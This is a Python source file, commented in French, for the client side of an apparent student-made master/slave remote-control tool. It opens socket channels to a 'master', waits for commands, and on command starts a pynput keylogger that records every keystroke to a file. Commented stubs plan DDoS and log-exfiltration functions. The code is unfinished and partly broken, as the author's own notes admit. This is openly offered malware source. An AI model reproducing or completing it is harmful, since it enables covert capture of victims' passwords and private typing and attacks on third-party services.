#importation du module socket afin de permetttre une communication réseau
import socket as modSocket
from pynput.keyboard import Key, Listener
import logging
import threading
import time

lock = threading.Lock()

"""
création de l'objet communication
avec le champ data, qui va contenir le message envoyé par le maitre.
il y a plusieurs champs qui vont être des actions a effectuer.
start_log() va lancer un logger qui va enregistrer tous ce qui vas être taper
sur le clavier.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Une fois que le code rentre dans le start_log(), il ne s'y retire plus, on rentre dans une
sorte de boucle infini, on est obligé de stopper de force le programme pour y sortir. Et ont veut que
le programme ne s'éteigne jamais, et puisse recommencer à communiquer avec le maitre.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
ddos() ..................
send_log() ..............
fais ce qui te plais avec les 2 methodes au dessus a toi de t'amuser :D
"""

class Connexion():
    # création de l'objet connexion avec le champ adresseMachine
    def __init__(self, adresseMachine, carteReseauEcoute, carteReseauConn):
        self.adresseMachine = adresseMachine
        self.carteReseauEcoute = carteReseauEcoute
        self.carteReseauConn = carteReseauConn


    #1er étape, mettre en place un canal de communication pour recevoir les messages du master
    def listen(self, carteReseauEcoute):
        # écoute sur toutes l'adresse du slave et sur le port 60 000
        adresseMachineMaitre = (("localhost", 60000))
        carteReseauEcoute.bind(adresseMachineMaitre)
        # une fois connecté, on le met en écoute et on accepte la connexion afin qu'il reçoive les instruction du master
        
        print("J'écoute")
        carteReseauEcoute.listen(5)
        connReseau, addr = carteReseauEcoute.accept()
        print("Connecté avec la machine : ", addr)
        connReseau.recv(1024).decode("utf-8")


        

    # 2è étape, mettre en place un canal de communication pour envoyer des messages au master
    def sendIP(self, carteReseauConn, adresseMachine):
        try:
            # on définit les coordonnées sur lesquelles le slave va envoyer son adresse ip
            carteReseauConn.connect(adresseMachine)
            carteReseauConn.send(b"Je me connecte")
            print("IP envoyée au master")
            a.listen(carteReseauEcoute)
        except ConnectionRefusedError:
            print("Machine maitre non connecté")
        


class Action():

    def __init__(self, data):
        self.data = data

    def start_log(self, data, connReseau):
        #chemin ou seront écris les logs voulus
        log_dir = r"C:\\Users\\Salihu Brilant\\Desktop"
        #met les informations de base concernant le logger
        #filename, spécifie le nom du fichier
        #format, impose les infos de base qui se trouveront dans le logger, içi la date avec l'heure puis les infos sur les entrées sur le clavier 
        logging.basicConfig(filename = (log_dir + "\\keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
        #Création d'une fonction appuie(), qui vas mettre en string touts les appuie sur le clavier
        def appuie(key):
            logging.info(str(key))  
        #une fois rentrer içi le programme écoute les appuie sur les entrées
        with Listener(on_press=appuie) as listener:
            connReseau.send(b"Logger actif")
            #cette condition nous permet d'arreter le logger
            if connReseau.recv(1024).decode("utf-8") != "stop":
                listener.join()
            connReseau.send(b"Logger inactif")
            print("Logger arretée")
            # !!!!!!! Je ne sais pas comment recommencer le programme une fois le logger arreté !!!!!!!!
        data = connReseau.recv(1024).decode("utf-8")


adresseMachine = ("localhost", 60000)
carteReseauEcoute = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
carteReseauConn = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
a = Connexion(adresseMachine, carteReseauConn, carteReseauEcoute)

a.sendIP(carteReseauConn, adresseMachine)

    


"""
#boucle qui permet de lancer une methode de l'objet communication
while data != "FIN":
    if data == "keylogger":
        print("OK je lance le keylogger")
        #lance la methode start_log de l'objet Communication
        a.start_log(data, conn)
        data = connReseau.recv(1024).decode("utf-8")
    data = connReseau.recv(1024).decode("utf-8")
# rajoute ddos() ou send_log(), choisi :D
"""

"""
Dernier problème que je ne comprend pas dans notre programme.
Il reçoit les réponse du maitre dans l'ordre (data = conn.recv(1024).decode("utf-8"))
par exemple si dans le maitre après avoir prit le choix pour lancer le keylogger, on ne choisi pas après
celui pour l'arreter on ne pourra plus arreter le programme par après.
car il y a un ordre qui ces créer dans les data.
:(
"""
    


